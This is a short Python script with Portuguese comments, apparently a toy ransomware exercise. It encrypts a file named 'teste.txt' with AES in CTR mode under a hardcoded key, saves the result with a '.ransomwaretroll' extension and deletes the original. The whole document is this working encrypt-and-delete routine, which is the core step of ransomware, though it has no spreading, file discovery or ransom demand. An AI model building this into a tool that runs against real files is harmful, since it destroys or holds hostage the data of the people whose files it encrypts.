import os
import pyaes

# Função para criptografar um arquivo
def encrypt_file(file_name, key):
    # Verificar se a chave tem o tamanho correto
    if len(key) not in [16, 24, 32]:
        raise ValueError("Chave inválida: A chave deve ter 16, 24 ou 32 bytes.")

    try:
        # Abrir o arquivo original
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Criptografar os dados
        aes = pyaes.AESModeOfOperationCTR(key)
        encrypted_data = aes.encrypt(file_data)

        # Nome do novo arquivo criptografado
        encrypted_file_name = file_name + ".ransomwaretroll"
        
        # Criar o arquivo criptografado
        with open(encrypted_file_name, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)

        # Remover o arquivo original
        os.remove(file_name)

        print(f"Arquivo '{encrypted_file_name}' criado com sucesso.")
    
    except FileNotFoundError:
        print(f"Erro: Arquivo '{file_name}' não encontrado.")
    except OSError as e:
        print(f"Erro ao remover o arquivo: {e}")
    except Exception as e:
        print(f"Ocorreu um erro: {e}")

# Nome do arquivo a ser criptografado
file_name = "teste.txt"

# Chave para criptografia (deve ter 16, 24 ou 32 bytes)
key = b"testeransomwares"

# Chamar a função para criptografar o arquivo
encrypt_file(file_name, key)
